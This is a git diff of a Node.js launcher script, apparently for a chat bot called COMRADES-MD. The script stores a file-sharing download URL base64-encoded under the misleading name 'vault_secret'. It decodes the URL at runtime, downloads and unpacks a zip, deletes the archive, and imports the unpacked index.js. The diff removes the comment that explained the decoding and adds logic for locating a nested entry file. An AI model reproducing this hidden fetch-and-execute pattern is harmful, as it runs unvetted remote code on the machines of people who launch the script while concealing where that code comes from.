@@ -7,7 +7,6 @@ import AdmZip from 'adm-zip';
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-
 const vault_secret = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2JvZzB2aTBycGthOWU5YmFtNm45My92aHViX2NvcmUuemlwP3Jsa2V5PXRlNDYzYTNhZWc1bWpmc3RqYWt5aG1vNmImc3Q9enB4Y29tNmsmZGw9MQ==";
 
 const download = (url, dest) => {
@@ -32,7 +31,6 @@ const download = (url, dest) => {
 async function startHub() {
     console.log('[V-HUB] SYSTEM STARTING...');
     try {
-        // Decode the URL in memory
         const fullUrl = Buffer.from(vault_secret, 'base64').toString('utf-8');
         const zipPath = path.join(process.cwd(), 'core.zip');
         const extractPath = path.join(process.cwd(), 'hub_temp');
@@ -47,8 +45,16 @@ async function startHub() {
         zip.extractAllTo(extractPath, true);
         fs.unlinkSync(zipPath);
         
+        // 🎯 THE PATH FIX: Check for the subfolder
+        let entryFile = path.join(extractPath, 'index.js');
+        const nestedFolder = path.join(extractPath, 'COMRADES-MD-main', 'index.js');
+
+        if (!fs.existsSync(entryFile) && fs.existsSync(nestedFolder)) {
+            entryFile = nestedFolder;
+            console.log('[V-HUB] DETECTED NESTED STRUCTURE');
+        }
+
         console.log('[V-HUB] BOOTING COMRADES-MD...');
-        const entryFile = path.join(extractPath, 'index.js');
         await import(`file://${entryFile}`);
     } catch (e) {
         console.error('[V-HUB] FATAL ERROR:', e.message);
